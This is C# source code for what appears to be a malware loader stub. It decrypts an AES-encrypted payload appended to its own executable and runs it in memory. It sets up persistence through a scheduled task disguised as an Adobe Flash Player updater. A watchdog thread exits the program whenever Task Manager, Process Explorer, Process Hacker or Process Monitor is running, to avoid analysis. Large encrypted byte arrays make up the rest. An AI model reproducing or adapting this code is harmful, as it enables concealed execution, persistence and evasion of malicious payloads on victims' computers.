﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace stub
{
    class Program
    {
        static string self = Environment.CommandLine.Split(new Char[] { ' ' })[0].Replace("\"", "");
        static string curDir = Path.GetDirectoryName(self);
        public static Thread t = new Thread(Ostrich);

        static void Main(string[] args)
        {

            try
            {
                t.Start();

                Directory.SetCurrentDirectory(curDir);

                TaskSheduler();

                Decrypt(args);
            }
            catch (Exception ex)
            {
                Console.Write(ex.Message);
            }

            try
            {
                t.Abort();
            }
            catch
            {

            }
        }

        public static void TaskSheduler()
        {
            if (!File.Exists("autorun"))
            {
                // Decrypt autorun
                byte[] decryptedAutorun = AES_Decrypt(encryptedAutroun);
                string autorun = Encoding.UTF8.GetString(decryptedAutorun);
                File.WriteAllText("autorun", autorun);

                byte[] selfB = Encoding.Default.GetBytes(self);
                FileStream fs = new FileStream("autorun", FileMode.Append);
                fs.Write(selfB, 0, selfB.Length);
                fs.Close();


                // Decrypt autorun1
                byte[] decryptedAutorun1 = AES_Decrypt(encryptedAutroun1);
                string autorun1 = Encoding.UTF8.GetString(decryptedAutorun1);
                File.AppendAllText("autorun", autorun1);

                // Create autorun in Task Sheduler
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "schtasks.exe";
                psi.Arguments = "/Create /tn AdobeFlashPlayerUpdateer /XML autorun";
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);

                Exit();
            }
        }

        private static void Exit()
        {
            t.Abort();
            Environment.Exit(0);
        }

        public static void Decrypt(string[] args)
        {
            MemoryStream ms = new MemoryStream(File.ReadAllBytes(self));
            // Seek to size
            ms.Seek(-4, SeekOrigin.End);
            // Read payload size
            byte[] payloadSize = new byte[4];
            ms.Read(payloadSize, 0, payloadSize.Length);
            int size = BitConverter.ToInt32(payloadSize, 0);
            // Seek payload + payloadSize
            ms.Seek(-(4 + size), SeekOrigin.End);
            // Read and decrypt payload bytes
            byte[] encryptedPayload = new byte[size];
            ms.Read(encryptedPayload, 0, encryptedPayload.Length);
            byte[] payload = AES_Decrypt(encryptedPayload);
            // Free memory
            ms.Close();
            // Run payload bytes
            Assembly.Load(payload).EntryPoint.Invoke(null, new object[] { args });
        }


        public static byte[] AES_Decrypt(byte[] encryptedBytes)
        {
            byte[] decryptedBytes = null;
            // Get password bytes
            byte[] passwordBytes = new byte[240];
            Array.Copy(encryptedBytes, passwordBytes, passwordBytes.Length);
            // Get encrypted payload bytes
            byte[] bytesToBeDecrypted = new byte[encryptedBytes.Length - passwordBytes.Length];
            Array.Copy(encryptedBytes, passwordBytes.Length, bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);

            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        private static void Ostrich()
        {
            string[] badDescription = { "Process Hacker", "Process Explorer", "Process Monitor", "Advanced SystemCare" };
            string[] badProcess = { "taskmgr", "Taskmgr" };

            while (true)
            {
                try
                {
                    // Search bad name process
                    foreach (Process process in Process.GetProcesses())
                        foreach (string badProc in badProcess)
                            if (process.ProcessName == badProc)
                                Environment.Exit(0);
                }
                catch
                {

                }

                try
                {
                    // Search bad description process
                    var searcher = new ManagementObjectSearcher("Select * From Win32_Process");
                    var processList = searcher.Get();

                    foreach (var process in processList)
                    {
                        var processName = process["Name"];
                        var processPath = process["ExecutablePath"];

                        if (processPath != null)
                        {
                            var fileVersionInfo = FileVersionInfo.GetVersionInfo(processPath.ToString());
                            var processDescription = fileVersionInfo.FileDescription;

                            foreach (string badDescr in badDescription)
                                if (processDescription.Contains(badDescr))
                                    Environment.Exit(0);
                        }
                    }
                }
                catch
                {

                }


                Thread.Sleep(500);
            }
        }

        public static byte[] encryptedAutroun = {
0x51,0x15,0x9A,0xA9,0x5A,0x24,0x4F,0xFC,0x3A,0xFD,0x63,0xC3,0x24,0x63,0x6A,0xF1,0x61,0x07,0x0E,0x36,0x7D,
0x3E,0x70,0xF4,0x79,0xE4,0x7F,0xCE,0x38,0xC9,0x70,0x41,0x3B,0x53,0x26,0x90,0xE9,0x7E,0x7C,0xAA,0x74,
0x49,0x4C,0xBE,0x55,0xEA,0x3D,0x1E,0x2B,0xED,0xB3,0xB6,0xBF,0x6C,0x99,0x13,0xA4,0xA6,0x2F,0x75,0xA4,
0x81,0xC4,0x70,0x8D,0x22,0x87,0xD0,0x3D,0xD9,0x07,0xE3,0x8A,0x64,0xC2,0x34,0xF1,0xB2,0x9E,0x8E,0xA7,
0x60,0xA2,0x4A,0x16,0xBA,0x81,0xCF,0xB9,0x13,0xEB,0x43,0x4E,0x07,0x05,0xF2,0x84,0xDB,0x30,0x33,0x63,
0x6C,0xE1,0x52,0xE5,0xCF,0x2B,0x5B,0xAA,0x65,0x22,0xF2,0x07,0xA0,0xCE,0x44,0xDE,0x7A,0x5A,0xD3,0xA0,
0xB8,0x17,0x2A,0xED,0xC4,0x95,0x83,0x5E,0xCF,0xAF,0x15,0x81,0x6A,0x2B,0x3A,0x7F,0x50,0x64,0x46,0x8E,
0x25,0x24,0x54,0xF0,0xF9,0x3B,0xAD,0x38,0xC1,0x14,0x0A,0x81,0x5D,0x93,0xAA,0x55,0xB7,0x65,0x21,0x3A,
0xA8,0xFD,0xDA,0xB6,0x0C,0x70,0x9D,0x75,0x93,0xC4,0x8D,0x16,0x14,0x44,0x7B,0x93,0xC2,0x39,0xF3,0x88,
0xE7,0x4A,0x9C,0xBB,0xA5,0x94,0x24,0xD7,0x81,0xE5,0xC7,0xEB,0x43,0x0B,0xE6,0x27,0x4A,0x9D,0xE4,0x88,
0x9E,0x38,0xA4,0xFC,0x86,0xF4,0x6C,0x18,0x17,0x16,0x92,0x7E,0x71,0x98,0x53,0x5D,0x60,0x1E,0x11,0x78,
0x4C,0xC5,0xF3,0xAE,0xFC,0xA1,0xD3,0x08,0x5E,0x53,0x49,0x25,0x55,0x6B,0xEA,0xAF,0xA6,0x9F,0x35,0xCE,
0x74,0x3E,0xAC,0x3B,0x3F,0xC0,0xFA,0xDF,0xAD,0x31,0x05,0x85,0x6C,0x96,0xE1,0xE5,0x37,0x12,0x65,0xC1,
0x47,0xC3,0xF0,0x3F,0xCD,0x1C,0x30,0x3E,0xE5,0x0C,0x9F,0xC8,0x98,0xC0,0x6D,0xD9,0x92,0xC1,0xC7,0xE5,
0x89,0x0A,0x39,0x43,0x46,0xD3,0x56,0x5F,0x01,0x49,0x7E,0x43,0xAF,0xB8,0xE5,0x92,0x3F,0xE2,0x8F,0x67,
0xB5,0xB9,0x81,0xD8,0x3D,0xB3,0x58,0x77,0x37,0x90,0x9C,0x7C,0x22,0x48,0x8A,0x9D,0xA9,0xC2,0x9A,0x88,
0xDD,0xAC,0xA1,0x79,0xD0,0xFF,0x9B,0x6F,0x1A,0xCE,0x87,0x2B,0x22,0x45,0xD1,0xAA,0x03,0x33,0x68,0x00,
0x75,0x3B,0x38,0x2B,0xCB,0x73,0x33,0x5B,0xAC,0xBC,0x1B,0x4F,0x56,0xD2,0x5C,0xD8,0x4F,0x54,0x47,0xEF,
0xB1,0x5A,0xC6,0x32,0x71,0xCB,0xAB,0x1C,0x37,0x06,0xD2,0xCA,0x2B,0x34,0x39,0xC0,0xD5,0x50,0x16,0xEE,
0xB5,0x8E,0x24,0x95,0x41,0xEC,0x9A,0x72,0xFB,0xCE,0xA4,0x1A,0x6D,0x65,0x2E,0x90,0x66,0x41,0x6B,0x3A,
0x3E,0x5F,0xE0,0x32,0x75,0xA6,0xCA,0x04,0x38,0x66,0x7A,0x2A,0xA0,0xC8,0x54,0x83,0xF7,0x39,0x06,0x3B,
0xBF,0xD0,0x08,0x1D,0x10,0x13,0x15,0xFA,0x0E,0x27,0xD0,0x69,0x08,0x04,0x5B,0xF6,0xF2,0x3C,0xCB,0xAD,
0x8F,0x94,0x08,0xAE,0x75,0x6B,0x4B,0x7B,0x39,0x76,0xC9,0x41,0xEB,0x5E,0x6D,0xE8,0xA1,0x3E,0xC3,0xF4,
0xCD,0x56,0xE5,0xD8,0xE5,0x92,0xD7,0x64,0x24,0x97,0x2D,0x3E,0x12,0x10,0xEC,0x45,0xB2,0xD6,0xA6,0x9B,
0x33,0x6A,0x89,0x96,0x59,0x16,0x81,0x6E,0x1F,0x10,0x87,0x3C,0xC8,0x60,0xF5,0xAB,0x85,0xB4,0xF6,0xCF,
0x62,0xF6,0x2D,0x5C,0x42,0xA5,0x76,0x08,0x43,0x8C,0x59,0x99,0xE2,0x18,0x91,0x5A,0x08,0xEE,0xF4,0x83,
0x1D,0x80,0xB0,0xF8,0xEB,0x5B,0x16,0x73,0x00,0xE7,0xF4,0x02,0x64,0xD9,0xC7,0x55,0xAA,0x16,0x63,0xE1,
0xFA,0xA8,0x81,0x15,0x08,0xE1,0x1B,0x30,0x1E,0x99,0xAE,0x01,0x48,0xBD,0xB7,0xFA,0x76,0x02,0x00,0x6F,
0x48,0xB2,0x87,0x58,0x76,0xF6,0x0B,0x8F,0x31,0xB1,0x17,0x4E,0x1C,0x76,0x66,0x46,0xE0,0x28,0x70,0x05,
0x15,0x1C,0x2D,0x16,0xB7,0x1D,0x29,0xB3,0x5E,0x85,0xD5,0x6D,0x7C,0x99,0xDE,0x36,0x5A,0xA4,0xC7,0x47,
0x95,0xA2,0x19,0xAA,0x50,0x0D,0x4B,0x6F,0xB1,0xD6,0x7D,0x49,0x1F,0x49,0x6C,0x79,0x0B,0xAC,0xA7,0x2B,
0x5B,0x4F,0xD6,0x67,0xFC,0x83,0x8E,0xF1,0x54,0xD1,0x91,0xA1,0x38,0xD6,0xA6,0x2F,0xD9,0x53,0xC1,0x47,
0xE2,0x8C,0x39,0x2E,0xA2,0x44,0x22,0x5A,0x6C,0xA1,0x0A,0xDA,0x09,0x7E,0xAC,0xFF,0x9D,0xBC,0x34,0x5B,
0xE2,0xF7,0xEE,0xCA,0x48,0x08,0xB2,0x98,0xB2,0xCE,0x92,0x2D,0xB2,0x52,0x6A,0x1C,0xC1,0xB2,0x68,0x30,
0x0C,0x62,0x78,0x23,0x26,0xAC,0x02,0x70,0xC3,0xB5,0xFD,0xC7,0xB8,0xD2,0x55,0x08,0xFF,0xAC,0xE5,0x44,
0xCA,0xEC,0xA5,0xCE,0x83,0x12,0xCA,0x52,0x9C,0xDD,0xCE,0x0E,0x92,0x95,0x81,0xEF,0x1A,0x1A,0xB9,0xC8,
0xDB,0x67,0x3F,0xDD,0xBD,0x0A,0xB1,0x31,0xDA,0xBE,0xB2,0x1B,0x4C,0xEF,0xFD,0xDF,0x1D,0x0C,0x07,0x0E,
0x54,0xA3,0x8A,0x3D,0x88,0x85,0x81,0x21,0x77,0xC8,0x1F,0xED,0xCF,0xDD,0x8D,0xDE,0x40,0x53,0xE6,0x6B,
0x99,0xE1,0xA7,0xC3,0x11,0xDE,0x35,0xB3,0x2C,0xC7,0x32,0x1D,0x26,0x22,0xBF,0x83,0xB8,0x28,0xA4,0x6F,
0x45,0xE5,0x51,0x30,0xCB,0x95,0x5E,0xB4,0xCA,0x93,0x06,0xFA,0x24,0x3E,0x75,0x5D,0x75,0x5F,0x37,0xE8,
0x51,0x8E,0xE1,0x75,0x2B,0x09,0x61,0xA9,0xBD,0xA2,0xDA,0x79,0x9B,0x01,0xE1,0x55,0x8E,0x10,0xEF,0xAF,
0x26,0xFF,0xB8,0x1D,0x96,0xFA,0x7E,0xD8,0x58,0xEE,0x14,0xCD,0xC7,0xA9,0xCB,0x44,0x55,0x65,0x72,0x1F,
0xF5,0x8B,0x21,0xAD,0xEE,0x34,0x95,0x67,0xD0,0xC5,0x54,0xAC,0xB3,0x52,0xB3,0xAB,0x50,0x8D,0x96,0x2D,
0x7A,0xD1,0xFB,0xE3,0x3E,0xAD,0xAF,0x70,0x55,0x3A,0x70,0xB5,0x8B,0x6C,0x30,0x2F,0x9D,0x34,0x92,0x8F,
0x31,0x94,0x24,0x2C,0xB9,0x4F,0xAC,0xBA,0x9F,0xC4,0xA0,0x76,0xF1,0xA7,0xF1,0xCE,0x0D,0x3D,0x39,0x0D,
0xA4,0x19,0x9B,0x7C,0x7D,0x0A,0xD7,0x00,0x27,0x2F,0xAE,0xA1,0x48,0x0B,0x4C,0xDD,0xBA,0xEF,0x30,0x44,
0x82,0xD2,0xC7,0x91,0x48,0xA5,0xAC,0x31,0xD7,0x9B,0xF5,0x41,0x05,0x25,0xDC,0xF4,0x46,0xFB,0x71,0x93,
0xB8,0xE8,0x46,0xAF,0xEA,0xD8,0x1E,0xD4,0x02,0x5F,0x96,0x31,0xA2,0xF2,0xCC,0x34,0xA5,0x9C,0x72,0xDE,
0x15,0x55,0x41,0x5A,0x94,0xDB,0x62,0xCB,0xFB,0x1D,0xBB,0x0A,0x32,0x8F,0xE8,0xE1,0xCE,0x2B,0xCF,0xFA,
0xEF,0x98,0x4E,0x9B,0x56,0x2C,0x65,0xFB,0xF8,0x48,0xA0,0x76,0xD1,0x25,0xCC,0x96,0x77,0xD7,0x2B,0xDF,
0x7D,0x7E,0x9D,0x2C,0x8A,0xD2,0x17,0x52,0xFF,0xDB,0xCD,0x7F,0x62,0xC1,0x9D,0xE0,0x34,0xB2,0x1A,0x12,
0xB3,0xC6,0xD3,0xE0,0xEC,0x87,0x7C,0x6B,0x0C,0x7F,0xFC,0x03,0x95,0x2A,0x9F,0x2B,0xE2,0x7E,0xBB,0x77,
0xEB,0x6A,0x40,0xF4,0x68,0x1A,0x5C,0xFF,0x91,0x4D,0x34,0xEA,0xC8,0x42,0x26,0x3D,0xF3,0x16,0x91,0x9D,
0x11,0x86,0x90,0x95,0x32,0x9F,0xE2,0xDC,0x0B,0x05,0x9D,0x39,0x07,0xE9,0x18,0x8B,0x94,0x88,0x3A,0xE1,
0x10,0x43,0x7E,0xDD,0xDA,0xF1,0xEC,0xE2,0x0D,0x76,0x71,0x35,0xF0,0xC3,0x8F,0x5C,0xFD,0x07,0xA9,0x9E,
0x1F,0x7D,0x85,0x99,0x4A,0x8E,0x32,0x6C,0x1A,0x7D,0x8E,0xAA,0xB4,0xE5,0x63,0xA1,0x54,0x4C,0x07,0x95,
0x08,0x4C,0x8B,0xFA,0x8D,0x5F,0xBC,0x6C,0x93,0xD4,0x22,0x4D,0x65,0xCB,0x99,0xCC,0x0C,0x8E,0xF9,0x09,
0x8E,0x3D,0x96,0x7A,0x41,0xC5,0x5B,0x86,0x57,0x15,0x95,0x96,0x5E,0xB9,0xE7,0x55,0xD7,0x45,0x9C,0x5A,
0x12,0x04,0x3B,0x7B,0xA8,0xF3,0x74,0xAD,0xC3,0x0E,0x54,0xDE,0x23,0x33,0x0B,0x0D,0x46,0x43,0x8B,0x7D,
0x98,0x96,0xBD,0x01,0x76,0x39,0xDC,0x13,0xC8,0x1B,0x60,0x42,0x18,0x1A,0x20,0xEB,0xAB,0x14,0xB6,0x09,
0x76,0xB1,0xD9,0x30,0xFB,0xE7,0xC8,0x2B,0x03,0x46,0x39,0xF2,0x06,0x9B,0x78,0xCD,0x6A,0xEA,0xC8,0x40,
0xB6,0x2A,0x42,0x41,0xDD,0x32,0xA4,0xB6,0x6E,0x0A,0x9F,0x35,0x2F,0x21,0xE4,0x7B,0x14,0x5E,0xCC,0x49,
0x3D,0xE3,0xD0,0xEF,0xEC,0x64,0x45,0xFA,0x92,0x71,0x90,0x53,0xD7,0xC1,0x91,0xC1,0xB6,0x4F,0x14,0xF2,
0x44,0xC4,0xB6,0x2A,0xF1,0x03,0x1E,0xA7,0x99,0x1D,0xF4,0x53,0x50,0x0E,0x68,0x5F,0xC9,0x67,0x8A,0x7D,
0x75,0x43,0x22,0x81,0x8F,0x4B,0x2E,0xC6,0x08,0x74,0xD1,0x95,0x43,0x6E,0x44,0x81,0xC3,0xA5,0xBD,0x06,
0xC1,0x74,0x58,0xC1,0x82,0x1C,0xFC,0xDB,0x80,0x8D,0x73,0x56,0xC6,0x0B,0x96,0xFC,0xFC,0x0F,0xC3,0xAC,
0x71,0x1F,0x64,0x63,0x35,0xA2,0x89,0xF1,0x14,0x9B,0x27,0x8D,0x1E,0xE5,0xFA,0x9E,0x1E,0x13,0x15,0x61,
0x12,0x37,0x72,0x89,0x3E,0x9E,0x78,0xED,0x33,0xEA,0xC5,0x00,0xD8,0x7B,0x1E,0x13,0x7B,0xDD,0xB4,0xB0,
0x02,0x00,0xF0,0xE9,0x02,0x70,0x9E,0xEF,0x8F,0x45,0x4E,0x67,0x67,0x84,0x09,0x6B,0x8D,0xFE,0x96,0xBD,
0x39,0xD4,0x2C,0xCE,0x19,0xEC,0x36,0xE6,0x89,0x7A,0xDF,0x75,0x53,0xFF,0x1F,0x92,0x58,0xE2,0x2A,0xDD,
0xC6,0xFB,0x8A,0x3A,0x84,0xD1,0x00,0xDD,0x9F,0x42,0x56,0x54,0xDE,0x8D,0xEE,0x2C,0xBD,0xDB,0x13,0x10,
0xD4,0x6A,0xE5,0xB4,0x16,0x40,0x3C,0x24,0x17,0x7C,0x0E,0x46,0x9B,0x9A,0xC1,0x79,0x1C,0xA2,0x64,0xB3,
0xC7,0xA2,0xA0,0x61,0xE9,0x69,0xA7,0xC2,0x89,0xCE,0x26,0x84,0x46,0x64,0x70,0xDB,0x8D,0x7F,0x7D,0x90,
0xFF,0x30,0x6C,0x0F,0xE4,0xE8,0xF3,0x87,0x00,0x78,0xE1,0x67,0xD4,0x72,0x4C,0x55,0x15,0x82,0x2D,0x79,
0xD8,0x13,0xA1,0x61,0x3B,0x4C,0xC0,0xB4,0xB3,0x47,0xF2,0xE4,0x95,0x6C,0x30,0x68,0x8D,0x8F,0xCC,0x5E,
0x10,0xE6,0x10,0xD1,0x4B,0x36,0x03,0x0A,0xE5,0xA3,0x54,0x95,0x36,0x7D,0x48,0xAA,0x4F,0x32,0x2E,0x91,
0xA6,0xD2,0x65,0x1E,0x9E,0x4F,0x26,0xB9,0xF5,0x05,0xF3,0x68,0x92,0x85,0x3E,0x60,0xD6,0x3F,0xFB,0x8C,
0x96,0x58,0x26,0x5D,0x14,0x03,0x67,0x55,0x60,0x51,0x8B,0xFD,0xA1,0x56,0x90,0x86,0x23,0xEB,0x2C,0xB9,
0x80,0x2A,0x48,0x5C,0x24,0x2C,0x20,0x83,0x14,0x1D,0x16,0x84,0x52,0xB3,0xC7,0xD5,0x5F,0x57,0x6B,0x31,
0x18,0x2E,0xF1,0xE9,0x5E,0xBC,0xC7,0xED,0x60,0x13,0xEA,0xE7,0xC1,0x9D,0x5F,0x0C,0xE9,0xB3,0xF5,0xF6,
0xC3,0xE5,0xAE,0xCE,0xFF,0x4F,0x9E,0xD8,0x20,0xF4,0xAB,0x62,0x52,0xA6,0x27,0x32,0x32,0xA3,0xC7,0x61,
0xC7,0x61,0x24,0xE7,0xDB,0xD1,0x87,0xF6,0x4A,0x8E,0x71,0xF3,0xE2,0xC0,0x04,0xB4,0x29,0x74,0xB9,0xC0,
0x72,0x28,0x55,0x92,0x2A,0xF4,0xBE,0x59,0x24,0xD4,0x06,0x39,0x6E,0xFC,0x69,0xEE,0x1A,0x04,0x9E,0xCA,
0x75,0x40,0x6C};

        public static byte[] encryptedAutroun1 = {
0xE5,0x23,0xB6,0xCB,0x1F,0xB0,0x58,0x89,0xAA,0x93,0x0B,0xAD,0x55,0xCD,0xD3,0x6F,0x5A,0xFD,0x45,0x84,0xF5,
0xF8,0x67,0xEC,0x4D,0x4B,0x06,0x9F,0x1C,0x93,0xDB,0x26,0xE4,0xC1,0xCF,0x80,0x7D,0xA5,0x79,0x96,0x46,
0x26,0x7B,0x6E,0xBC,0x7F,0x8A,0xC6,0x11,0xB1,0x94,0x69,0x5E,0xB9,0xE9,0xED,0xBC,0xCA,0x7E,0xD4,0xAA,
0xB9,0x6C,0x17,0xB7,0xE5,0xC8,0x93,0xFD,0x53,0xF1,0xB5,0x84,0xAE,0x3D,0xCF,0x7D,0xF8,0x2F,0xCD,0xC0,
0x3F,0x8D,0x6B,0xFF,0x72,0xC7,0x2B,0xD8,0xE2,0xC3,0xB3,0x27,0xA5,0xEB,0x8D,0xB9,0x63,0xB6,0xD7,0xB7,
0xF6,0xC8,0xBE,0xBF,0xDE,0xE5,0xAF,0x7C,0x19,0x6F,0xC3,0x9A,0xB0,0x13,0x6A,0x2B,0x01,0x18,0x45,0x1D,
0x9C,0xBB,0x1B,0x8F,0x3E,0x8E,0xDF,0xC2,0xAF,0x16,0x19,0x41,0x58,0x15,0xC9,0x76,0xCE,0xAB,0x20,0x8C,
0x18,0xAE,0xBF,0x72,0x00,0x18,0x76,0x91,0x81,0x61,0xB7,0x4B,0x71,0xBA,0x1A,0x3B,0xAD,0x2F,0x81,0x50,
0x06,0xEC,0xCC,0x03,0x56,0x81,0x42,0x9A,0x49,0xF3,0x5D,0x56,0xF7,0xB9,0x05,0xEE,0xFC,0xA9,0x8E,0x26,
0x17,0x4D,0x41,0x4D,0x5E,0xCD,0xD0,0x9E,0xFA,0x8E,0xC9,0x9E,0x2A,0xCF,0x86,0x2B,0xE2,0xBC,0x1C,0x7F,
0xD5,0xDC,0x47,0x8D,0x04,0x61,0x54,0xB7,0xB4,0x2C,0x3F,0x03,0xA1,0x5B,0x39,0xB8,0xAB,0x7E,0xA4,0x88,
0xB0,0xA4,0x9F,0xBB,0x29,0xBE,0x2C,0x27,0x32,0xD9,0x0B,0x3F,0x8D,0x0F,0x50,0x3B,0x06,0xB3,0x49,0x40,
0xB1,0x65,0x72,0x5A,0xCB,0x10,0xCD,0xCF,0xFF,0xF5,0x21,0xF8,0xEB,0xA1,0x47,0x7B,0xE8,0xBF,0xBF,0xB2,
0x43,0x44,0xE5,0xE0,0x0B,0x96,0x13,0xBF,0xC2,0x13,0xB8,0xC9,0xAD,0x58,0x0E,0x41,0xEB,0x2B,0x3A,0x90,
0xC4,0xD7,0xAF,0x6E,0x3F,0x22,0x47};


        //        public static byte[] encryptedAutroun = {
        //0xD6,0xE4,0xED,0xFA,0xE7,0x8A,0x0B,0xA5,0x6B,0x17,0x36,0xF6,0xFA,0x6D,0xE8,0x0E,0x47,0x8F,0xC3,0x68,0xCF,
        //0xAE,0x46,0x48,0x5A,0x5B,0x65,0xC7,0x9E,0x76,0x66,0x69,0x4D,0xE3,0x5B,0x6C,0x82,0xFC,0x39,0xDD,0xC4,
        //0xEA,0x5F,0x2F,0xF6,0x11,0xB0,0xBA,0x4B,0x8C,0x19,0xC9,0xB1,0x9D,0x31,0x28,0x9D,0xA4,0xA0,0x8C,0x25,
        //0x43,0x07,0xF5,0xB1,0xCC,0xA8,0x16,0x12,0x7B,0x8B,0x4B,0x56,0xE6,0xA4,0xE5,0x4E,0x17,0x52,0x48,0xAB,
        //0xAA,0x7C,0x12,0x5C,0x9C,0xB8,0xB0,0xB2,0x32,0xCF,0xDD,0x5B,0xAD,0xB7,0x80,0xE3,0x6A,0x7E,0x29,0x68,
        //0x9A,0xA8,0xD0,0x00,0xCE,0x72,0xCB,0xF8,0x4B,0xD9,0x85,0x52,0x58,0xE0,0x7B,0xC7,0xF4,0x98,0x14,0x14,
        //0xF8,0x63,0xDF,0xAB,0xAD,0xEF,0xA9,0x2E,0x23,0x02,0xE4,0x98,0x28,0xDF,0x10,0x02,0xAC,0x11,0x8E,0x2A,
        //0xEC,0xB7,0x67,0x59,0x49,0x8A,0x03,0xCC,0x3C,0xB9,0xEE,0xD1,0x6A,0x14,0x70,0x37,0xC8,0x24,0x52,0xDE,
        //0xC9,0x9C,0xD4,0x49,0xF5,0xED,0x29,0x78,0xD0,0x79,0x1B,0xE2,0x0A,0xEA,0x28,0x40,0xFC,0x86,0x62,0x23,
        //0xEC,0xDD,0xF2,0x6A,0x14,0x12,0x2E,0x14,0x6F,0xD9,0x39,0x87,0xBF,0xB0,0x61,0x50,0xE3,0x1E,0x63,0x5C,
        //0x60,0x8B,0xFB,0xC3,0x9D,0x0B,0xC7,0x7F,0xEC,0x2F,0x3A,0x42,0xC1,0x2F,0xF2,0xEB,0xAA,0x6A,0x34,0xE2,
        //0xBE,0x15,0x08,0xF7,0x3F,0x93,0x23,0x59,0x89,0xD7,0x5D,0xDE,0x22,0x05,0xC2,0x60,0xE1,0x2E,0xCC,0x37,
        //0x4A,0xFB,0x94,0x8A,0xED,0xE2,0x3F,0x82,0x23,0x1A,0xB6,0x18,0xAA,0xC3,0x9C,0xB7,0x30,0xE5,0xA7,0x8F,
        //0x01,0xC5,0x3F,0x34,0x54,0xA6,0x83,0xA7,0xE3,0x01,0x0B,0x27,0xCF,0xAC,0xA8,0xD1,0x77,0x76,0x89,0x24,
        //0x89,0x3E,0x04,0x96,0x4F,0x68,0x5B,0xC5,0xFB,0x07,0x22,0x00,0x73,0x7A,0x48,0xAB,0x3D,0xE4,0xD3,0x9C,
        //0x7C,0x4D,0x8B,0xD5,0x13,0xE6,0x0D,0xAC,0x1C,0xF9,0xF6,0x9A,0x53,0x25,0xBE,0xB3,0xF8,0xE0,0xB9,0x44,
        //0x27,0xDF,0x9E,0x8D,0x05,0x73,0xB4,0x7E,0x12,0x08,0xB1,0x86,0xAC,0xED,0x1E,0x00,0x2A,0xEC,0xEE,0x6B,
        //0x92,0xC7,0x50,0xE3,0x42,0xC2,0x83,0xB8,0x2B,0xF3,0x5D,0x01,0x1D,0x3C,0x29,0x5D,0xC6,0x29,0x1A,0x97,
        //0x74,0x69,0xAD,0x5B,0x86,0x1D,0x9E,0xDE,0xDE,0xD5,0x82,0x3D,0x16,0x47,0x6F,0xC2,0x72,0x6F,0x9E,0x5C,
        //0x7F,0x2B,0x40,0xDA,0xE1,0x9D,0x36,0x49,0x60,0xED,0xDD,0x08,0xAD,0xC2,0xE6,0x34,0xD0,0xB0,0x7C,0xAE,
        //0x4A,0x37,0xD1,0xE9,0xD3,0x71,0x5F,0xDE,0xC6,0x9F,0x36,0x23,0x50,0x76,0xD0,0x48,0x8B,0x2D,0x00,0xDE,
        //0xDA,0x43,0xCF,0x2D,0x25,0xA3,0x1C,0x27,0xEE,0x4E,0xD8,0xDB,0x8C,0x63,0x25,0x2C,0xF2,0xA8,0x03,0xF9,
        //0x5D,0x88,0xFC,0x0B,0x8B,0xAF,0xDF,0xF4,0x42,0x75,0x5C,0x26,0x44,0xE9,0x21,0x35,0x72,0x9E,0x72,0xD8,
        //0x57,0xCF,0x8F,0x4F,0xD7,0x4F,0xB8,0x9E,0xBA,0x7F,0x51,0x4D,0x52,0xAB,0x30,0x24,0x34,0x40,0xAA,0x3F,
        //0xE9,0xD6,0x93,0x86,0x95,0x3F,0x6E,0xD3,0x39,0xF2,0x35,0x72,0xC1,0x26,0x54,0x91,0x32,0x3D,0x4B,0x3E,
        //0xCA,0x0D,0x61,0x22,0xB9,0x5D,0xB6,0x9B,0xC0,0x64,0x62,0x21,0xF7,0x6B,0xCA,0x75,0xE2,0xB3,0xE1,0x9F,
        //0x56,0x5E,0xB6,0x26,0xA9,0x3B,0x9C,0x97,0x63,0x33,0x1A,0x5F,0x38,0xD1,0x0C,0xD3,0xB2,0x5B,0x30,0x35,
        //0x16,0x5D,0xD8,0x7F,0x3F,0x2E,0x52,0x85,0x2C,0x63,0xF8,0x10,0x04,0x23,0x6E,0x1D,0xD2,0xD6,0x29,0xEB,
        //0x5F,0xC9,0xD4,0x05,0x6F,0xB1,0xDB,0x48,0xC7,0x1C,0x47,0xC7,0x7F,0x2E,0x3C,0x10,0x9D,0x5A,0xB9,0xF1,
        //0x26,0xEA,0x64,0x46,0x0D,0xA9,0x38,0xE8,0xEF,0xC6,0x09,0x68,0x7E,0x0A,0x6A,0xFF,0x79,0xAC,0x5E,0x73,
        //0xA3,0x8E,0xFE,0x33,0x23,0x38,0x27,0xB1,0x6C,0x4E,0x8C,0x1D,0x56,0x03,0x1A,0xB6,0x31,0x6C,0x22,0x84,
        //0xD3,0x05,0xA3,0x75,0x6A,0x5D,0x00,0x69,0x73,0xE0,0xBC,0x40,0x66,0xE4,0x5B,0x44,0x8D,0x98,0x76,0x89,
        //0x79,0x8D,0xF7,0x80,0xCE,0x8C,0x9A,0x2C,0x50,0xBC,0xB2,0x85,0x8E,0x47,0x2E,0xC5,0x75,0x3D,0xF7,0x23,
        //0x34,0x8F,0x71,0x16,0xF8,0x53,0x0F,0x7B,0x55,0x01,0xE4,0xF7,0x68,0xE6,0x33,0x0F,0xB1,0x15,0x1C,0x15,
        //0x7B,0x15,0xC5,0xF6,0x0C,0x55,0x07,0xDE,0x32,0xD3,0xC8,0x8A,0xC5,0x1C,0x77,0xA4,0xC5,0x11,0xA9,0x9E,
        //0xB9,0x3F,0x35,0xE5,0x88,0xAA,0x27,0x14,0x41,0x0D,0x70,0xD1,0xE8,0xE4,0x48,0x26,0x2C,0x56,0x7F,0x1E,
        //0xD3,0xA4,0x35,0x69,0x02,0x3C,0x0F,0x36,0xB0,0x18,0x97,0xA4,0x18,0x27,0x94,0xB5,0x17,0xE8,0xA3,0xE2,
